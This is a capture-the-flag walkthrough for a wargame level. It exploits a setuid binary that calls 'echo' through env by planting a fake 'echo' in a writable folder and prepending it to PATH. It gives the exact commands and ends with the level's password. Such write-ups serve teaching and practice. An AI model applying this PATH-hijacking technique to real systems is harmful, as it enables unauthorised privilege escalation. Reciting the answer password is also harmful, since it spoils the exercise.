# LEVEL 03

## 💡 Explanation

In this level we can observe, with a simple ```ls -la``` in the home, that we have:
1. A binary with sticky rights, that prints us 'Exploit me' when running it.
2. When Launching ```strings level03``` we find a command that give us the solution to the problem....:   
`/usr/bin/env echo exploit me`

In this level we have to:
1. Find a folder where we have rights to create files
2. In this folder, modify the command `echo` to make it run `getflag` with the flag03 user permissions
3. Add this new command to our PATH so that the binary will run this new echo command with the flag03 user permissions.


## 👾 Commands

```
strings level03
which getflag
export PATH=/var/crash:$PATH
echo "getflag > /var/crash/flag" > /var/crash/echo
chmod +x /var/crash/echo
./level03
cat /var/crash/flag
```

## 🔍 Resources

- [Linux strings command](https://www.javatpoint.com/linux-strings-command#:~:text=Linux%20strings%20command%20is%20used,text%20from%20an%20executable%20file.)
- [Linux env command](https://www.computerhope.com/unix/uenv.htm#:~:text=env%20is%20a%20shell%20command,without%20modifying%20the%20current%20one.)

## 🔥 Password
`qi0maab88jeaj46qoumi7maus`
